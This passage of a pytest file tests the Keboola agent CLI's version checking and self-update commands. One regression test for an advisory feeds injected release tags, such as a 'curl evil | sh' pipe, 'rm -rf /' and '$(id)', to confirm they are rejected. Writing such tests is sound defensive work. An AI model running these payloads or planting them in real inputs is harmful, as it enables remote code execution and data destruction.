    def test_rejects_adversarial_release_tag(self, mock_get: MagicMock) -> None:
        """GHSA-x6cx: a tag whose valid version prefix is followed by garbage
        must be rejected. The old non-end-anchored ``re.match`` accepted it on
        the prefix, letting it flow into the upgrade command."""
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_get.return_value = mock_response
        for bad in (
            "v0.99.0; curl evil | sh",
            "v0.99.0 && rm -rf /",
            "v0.99.0/../../x",
            "v0.99.0$(id)",
            "v0.99.0evil",
            "vgarbage",
        ):
            mock_response.json.return_value = {"tag_name": bad}
            assert _fetch_kbagent_latest_version() is None, bad

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_accepts_valid_stable_and_beta_tags(self, mock_get: MagicMock) -> None:
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_get.return_value = mock_response
        for tag, expected in (
            ("v0.65.1", "0.65.1"),
            ("v0.43.0b1", "0.43.0b1"),
            ("0.65.2", "0.65.2"),
        ):
            mock_response.json.return_value = {"tag_name": tag}
            assert _fetch_kbagent_latest_version() == expected, tag

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_prerelease_returns_highest_pep440_version(self, mock_get: MagicMock) -> None:
        """With include_prerelease=True: pick highest by PEP 440 ordering."""
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        # GitHub /releases returns newest-first, but the function must sort
        # by SemVer/PEP 440, not by API order -- otherwise a hot-fix to an
        # older release line (e.g. v0.41.11 after v0.42.0) would win.
        mock_response.json.return_value = [
            {"tag_name": "v0.41.11", "draft": False, "prerelease": False},
            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
            {"tag_name": "v0.43.0b1", "draft": False, "prerelease": True},
            {"tag_name": "v0.43.0b2", "draft": False, "prerelease": True},
        ]
        mock_get.return_value = mock_response

        result = _fetch_kbagent_latest_version(include_prerelease=True)

        assert result == "0.43.0b2"
        # Plural /releases endpoint -- only one call.
        url = mock_get.call_args.args[0]
        assert url.endswith("/releases")

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_prerelease_skips_drafts(self, mock_get: MagicMock) -> None:
        """Draft releases must be ignored even when newest by tag."""
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_response.json.return_value = [
            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
            {"tag_name": "v0.43.0b1", "draft": True, "prerelease": True},
        ]
        mock_get.return_value = mock_response

        result = _fetch_kbagent_latest_version(include_prerelease=True)

        # Draft 0.43.0b1 skipped -> 0.42.0 wins.
        assert result == "0.42.0"

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_prerelease_falls_back_to_stable_when_no_betas(self, mock_get: MagicMock) -> None:
        """When no pre-releases exist, the highest stable still wins."""
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_response.json.return_value = [
            {"tag_name": "v0.41.10", "draft": False, "prerelease": False},
            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
        ]
        mock_get.return_value = mock_response

        assert _fetch_kbagent_latest_version(include_prerelease=True) == "0.42.0"

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_prerelease_ignores_invalid_tags(self, mock_get: MagicMock) -> None:
        """Hand-rolled tags that don't parse as PEP 440 are silently dropped."""
        mock_response = MagicMock()
        mock_response.raise_for_status = MagicMock()
        mock_response.json.return_value = [
            {"tag_name": "vnext", "draft": False, "prerelease": True},  # invalid
            {"tag_name": "v0.42.0", "draft": False, "prerelease": False},
            {"tag_name": "wip", "draft": False, "prerelease": True},  # invalid
        ]
        mock_get.return_value = mock_response

        assert _fetch_kbagent_latest_version(include_prerelease=True) == "0.42.0"

    @patch("keboola_agent_cli.services.version_service.httpx.get")
    def test_prerelease_http_failure_returns_none(self, mock_get: MagicMock) -> None:
        """Any httpx error returns None without crashing the caller."""
        import httpx

        mock_get.side_effect = httpx.HTTPError("upstream is down")
        assert _fetch_kbagent_latest_version(include_prerelease=True) is None


class TestResolveKbagentWheelUrl:
    """resolve_kbagent_wheel_url HEAD-probes the Release asset (issue #353)."""

    @patch("keboola_agent_cli.services.version_service.httpx.head")
    def test_returns_url_when_asset_present(self, mock_head: MagicMock) -> None:
        mock_head.return_value = MagicMock(status_code=200)
        url = resolve_kbagent_wheel_url("0.60.0")
        assert url == (
            "https://github.com/keboola/cli/releases/download/"
            "v0.60.0/keboola_cli-0.60.0-py3-none-any.whl"
        )
        # follow_redirects is required to traverse GitHub's asset CDN redirect.
        assert mock_head.call_args.kwargs.get("follow_redirects") is True

    @patch("keboola_agent_cli.services.version_service.httpx.head")
    def test_returns_none_on_404(self, mock_head: MagicMock) -> None:
        mock_head.return_value = MagicMock(status_code=404)
        assert resolve_kbagent_wheel_url("9.9.9") is None

    @patch("keboola_agent_cli.services.version_service.httpx.head")
    def test_returns_none_on_http_error(self, mock_head: MagicMock) -> None:
        import httpx

        mock_head.side_effect = httpx.HTTPError("network down")
        assert resolve_kbagent_wheel_url("0.60.0") is None

    def test_returns_none_for_empty_version(self) -> None:
        # Guards the None/"" caller path -- no network call is made.
        assert resolve_kbagent_wheel_url(None) is None
        assert resolve_kbagent_wheel_url("") is None


class TestGetUpdateTimeout:
    """get_update_timeout resolves the self-update subprocess timeout (issue #353)."""

    def test_default_is_300(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("KBAGENT_UPDATE_TIMEOUT", raising=False)
        assert get_update_timeout() == 300.0

    def test_env_override(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("KBAGENT_UPDATE_TIMEOUT", "600")
        assert get_update_timeout() == 600.0

    @pytest.mark.parametrize("bad_value", ["", "   ", "bogus", "-5", "0", "12.x"])
    def test_invalid_env_falls_back_to_default(
        self, monkeypatch: pytest.MonkeyPatch, bad_value: str
    ) -> None:
        # Non-numeric or non-positive overrides must NOT disable the timeout --
        # they silently fall back to the 300s default.
        monkeypatch.setenv("KBAGENT_UPDATE_TIMEOUT", bad_value)
        assert get_update_timeout() == 300.0


class TestBuildKbagentWheelInstall:
    """build_kbagent_upgrade_command wheel_url fast path (issue #353)."""

    WHEEL = (
        "https://github.com/keboola/cli/releases/download/v1.2.3/keboola_cli-1.2.3-py3-none-any.whl"
    )

    @patch("keboola_agent_cli.services.version_service.has_server_extras", return_value=True)
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_wheel_with_server_extras(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        cmd = build_kbagent_upgrade_command(wheel_url=self.WHEEL)
        assert cmd is not None
        assert cmd == [
            "/usr/bin/uv",
            "tool",
            "install",
            "--force",
            f"keboola-cli[server] @ {self.WHEEL}",
        ]
        # The wheel path uses a PEP 508 direct ref -- no git+ source, no --with.
        assert all("git+" not in part for part in cmd)
        assert "--with" not in cmd

    @patch("keboola_agent_cli.services.version_service.has_server_extras", return_value=False)
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_wheel_without_server_extras(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        cmd = build_kbagent_upgrade_command(wheel_url=self.WHEEL)
        assert cmd == [
            "/usr/bin/uv",
            "tool",
            "install",
            "--force",
            f"keboola-cli @ {self.WHEEL}",
        ]

    @patch("keboola_agent_cli.services.version_service.has_server_extras", return_value=False)
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_pip_fallback_wheel(self, mock_which: MagicMock, mock_has_server: MagicMock) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/pip" if x == "pip" else None
        cmd = build_kbagent_upgrade_command(wheel_url=self.WHEEL)
        assert cmd == [
            "/usr/bin/pip",
            "install",
            "--upgrade",
            f"keboola-cli @ {self.WHEEL}",
        ]

    @patch("keboola_agent_cli.services.version_service.has_server_extras", return_value=False)
    @patch("keboola_agent_cli.services.version_service.shutil.which", return_value=None)
    def test_wheel_no_tools_returns_none(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        assert build_kbagent_upgrade_command(wheel_url=self.WHEEL) is None

    @patch("keboola_agent_cli.services.version_service.has_server_extras", return_value=True)
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_wheel_url_takes_precedence_over_prerelease(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        """wheel_url wins over prerelease / target_version (git-source knobs)."""
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        cmd = build_kbagent_upgrade_command(
            prerelease=True, target_version="1.2.3", wheel_url=self.WHEEL
        )
        assert cmd is not None
        assert "--prerelease=allow" not in cmd
        assert all("git+" not in part for part in cmd)
        assert cmd[-1] == f"keboola-cli[server] @ {self.WHEEL}"


class TestBuildKbagentUpgradeCommand:
    """Resolver pre-release opt-in propagation (since v0.42.0)."""

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_without_extras_no_prerelease(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        mock_has_server.return_value = False

        cmd = build_kbagent_upgrade_command()

        assert cmd is not None
        assert "--prerelease=allow" not in cmd
        assert "--upgrade" in cmd

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_without_extras_with_prerelease(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        mock_has_server.return_value = False

        cmd = build_kbagent_upgrade_command(prerelease=True)

        assert cmd is not None
        assert "--prerelease=allow" in cmd
        # Flag must sit before the install spec (positional last arg).
        assert cmd.index("--prerelease=allow") == len(cmd) - 2

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_with_extras_with_prerelease(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        mock_has_server.return_value = True

        cmd = build_kbagent_upgrade_command(prerelease=True)

        assert cmd is not None
        assert "--prerelease=allow" in cmd
        # Extras flag preserved
        assert "--with" in cmd
        assert "keboola-cli[server]" in cmd

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_pip_fallback_with_prerelease(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        mock_which.side_effect = lambda x: "/usr/bin/pip" if x == "pip" else None
        mock_has_server.return_value = False

        cmd = build_kbagent_upgrade_command(prerelease=True)

        assert cmd is not None
        # pip uses --pre, not --prerelease=allow
        assert "--pre" in cmd
        # Must sit after the `install` verb, before `--upgrade`
        assert cmd.index("--pre") == cmd.index("install") + 1

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_prerelease_with_target_version_appends_tag(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        """Variant B fix: prerelease+target_version tag-pins install URL.

        Without this, uv resolves the default branch (`main`) which
        carries the latest stable pyproject.toml -- even though the
        version fetcher advertised a beta tag on a feature branch. Pinning
        ``@v<version>`` forces uv to install the exact commit the tag
        points to.
        """
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        mock_has_server.return_value = False

        cmd = build_kbagent_upgrade_command(prerelease=True, target_version="0.44.0b1")

        assert cmd is not None
        # Install source = last positional arg, must end with @v<version>.
        assert cmd[-1].endswith("@v0.44.0b1")
        # --prerelease=allow still required so the resolver accepts the
        # PEP 440 pre-release spec at the tag's pyproject.toml.
        assert "--prerelease=allow" in cmd

    @patch("keboola_agent_cli.services.version_service.has_server_extras")
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    def test_uv_stable_with_target_version_ignores_tag(
        self, mock_which: MagicMock, mock_has_server: MagicMock
    ) -> None:
        """target_version is ignored unless prerelease=True.

        Stable upgrades always track main (which IS the stable channel),
        so tag-pinning would just add a needless HTTP round-trip without
        changing the resolved version.
        """
        mock_which.side_effect = lambda x: "/usr/bin/uv" if x == "uv" else None
        mock_has_server.return_value = False

        cmd = build_kbagent_upgrade_command(prerelease=False, target_version="0.43.3")

        assert cmd is not None
        # No tag suffix when prerelease=False, even if target_version supplied.
        assert not cmd[-1].endswith("@v0.43.3")
        assert "@v" not in cmd[-1]


# ---------------------------------------------------------------------------
# issue #324: keboola-mcp-server pre-release dependency opt-in
# ---------------------------------------------------------------------------


class TestMcpPrereleaseOptIn:
    """Regression tests for issue #324.

    keboola-mcp-server >= 1.55.0 pins a pre-release-only transitive
    dependency (``toon-format~=0.9.0b1``; on PyPI toon-format ships only
    0.1.0 stable + 0.9.0b1 pre-release). uv refuses pre-releases by
    default, so a bare ``uv tool upgrade`` backtracks to the last MCP
    release predating the pin (v1.32.0) and exits 0 -- pinning the fleet to
    a stale server while reporting a newer version is "available". Every
    upgrade path -- run internally AND shown to users -- must opt into
    pre-releases or the auto-update silently no-ops forever.

    Note: ``--prerelease=if-necessary`` is NOT sufficient -- a *stable*
    toon-format (0.1.0) exists, so uv judges a pre-release "unnecessary"
    and then fails the pin. Only ``--prerelease=allow`` resolves it. These
    tests pin the literal expected flag rather than importing the
    production constant, so a regression in the constant's value is caught.
    """

    @pytest.mark.parametrize(
        ("method", "expected_flag"),
        [
            ("uv_tool", "--prerelease=allow"),
            ("uvx", "--prerelease=allow"),
            ("pip_env", "--pre"),
        ],
    )
    @patch("keboola_agent_cli.services.version_service.shutil.which")
    @patch("keboola_agent_cli.services.version_service.subprocess.run")
    def test_internal_upgrade_command_opts_into_prereleases(
        self,
        mock_run: MagicMock,
        mock_which: MagicMock,
        method: str,
        expected_flag: str,
    ) -> None:
        mock_which.return_value = "/usr/local/bin/uv"
        mock_run.return_value = MagicMock(returncode=0, stdout="ok", stderr="")

        ok, _info = _perform_mcp_update(method=method)

        assert ok is True
        cmd = mock_run.call_args.args[0]
        assert expected_flag in cmd, f"{method} command missing {expected_flag}: {cmd}"
        assert MCP_PACKAGE_NAME in cmd

    @pytest.mark.parametrize(
        ("method", "expected_flag"),
        [
            ("uv_tool", "--prerelease=allow"),
            ("uvx", "--prerelease=allow"),
            ("pip_env", "--pre"),
            ("none", "--prerelease=allow"),
        ],
    )
    @patch("keboola_agent_cli.services.version_service._fetch_mcp_latest_version")
    @patch("keboola_agent_cli.services.version_service._is_uvx_available")
    @patch("keboola_agent_cli.services.version_service._get_local_mcp_version")
    @patch("keboola_agent_cli.services.version_service._detect_mcp_install_method")
    def test_user_facing_command_opts_into_prereleases(
        self,
        mock_detect: MagicMock,
        mock_local: MagicMock,
        mock_uvx: MagicMock,
        mock_mcp_latest: MagicMock,
        method: str,
        expected_flag: str,
    ) -> None:
        mock_uvx.return_value = True
        mock_mcp_latest.return_value = "1.61.3"
        mock_local.return_value = "1.32.0"
        mock_detect.return_value = method

        result = VersionService().get_versions()

        upgrade_command = result["dependencies"][0]["upgrade_command"]
        assert expected_flag in upgrade_command, (
            f"{method} upgrade_command missing {expected_flag}: {upgrade_command!r}"
        )


class TestComposeUpdateSummary:
    """The one-line summary must distinguish up-to-date from a FAILED update.

    Regression for the #424 rename breakage: a self-update that failed (e.g.
    `Executable already exists: kbagent`) was rendered as `already up to date`,
    so users had no signal the upgrade never happened.
    """

    def test_kbagent_failure_is_surfaced_not_masked(self) -> None:
        kbagent = {
            "updated": False,
            "current_version": "0.62.0",
            "latest_version": "0.63.1",
            "message": (
                "Update failed: Resolved 46 packages\n"
                "error: Executable already exists: kbagent (use `--force` to overwrite)"
            ),
        }
        mcp = {"updated": False, "up_to_date": True, "current_version": "1.66.0"}

        summary = VersionService._compose_update_summary(kbagent, mcp)

        assert "update FAILED" in summary
        assert "Executable already exists: kbagent" in summary
        # The masking bug: a failure must NOT be reported as up to date.
        assert "(already up to date)" not in summary.split("|")[0]

    def test_kbagent_up_to_date_renders_up_to_date(self) -> None:
        kbagent = {
            "updated": False,
            "up_to_date": True,
            "current_version": "0.63.1",
            "latest_version": "0.63.1",
        }
        mcp = {"updated": False, "up_to_date": True, "current_version": "1.66.0"}

        summary = VersionService._compose_update_summary(kbagent, mcp)

        assert "kbagent v0.63.1 (already up to date)" in summary
        assert "FAILED" not in summary

    def test_kbagent_upgraded_renders_arrow(self) -> None:
        kbagent = {"updated": True, "current_version": "0.62.0", "latest_version": "0.63.1"}
        mcp = {"updated": False, "up_to_date": True, "current_version": "1.66.0"}

        summary = VersionService._compose_update_summary(kbagent, mcp)

        assert "kbagent v0.62.0 -> v0.63.1" in summary

    def test_failure_tail_is_last_nonempty_line(self) -> None:
        msg = "Update failed: line one\n\n  error: the real reason  \n"
        assert VersionService._summarize_failure_tail(msg) == "error: the real reason"
        assert VersionService._summarize_failure_tail("") == "update failed"
        assert VersionService._summarize_failure_tail(None) == "update failed"
